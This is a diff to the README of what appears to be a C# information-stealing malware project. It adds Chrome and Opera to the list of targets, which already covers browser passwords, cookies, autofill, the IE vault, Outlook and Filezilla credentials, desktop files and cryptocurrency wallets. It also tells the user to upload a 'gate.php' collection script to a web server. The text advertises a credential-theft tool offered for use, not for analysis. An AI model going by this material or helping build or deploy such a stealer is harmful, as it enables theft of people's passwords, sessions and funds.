@@ -1,7 +1,7 @@
 # stealer
 
 C#  stealer
-Chromium ,Edge ,Firefox, IE passwords, cookies , bookmarks , autofill  
+Chrome, Opera ,Chromium ,Edge ,Firefox, IE passwords, cookies , bookmarks , autofill  
 IE vault , Outlook passwords , Filezilla , desktop files  ,wallets
 
 Upload  gate.php  to  web server .
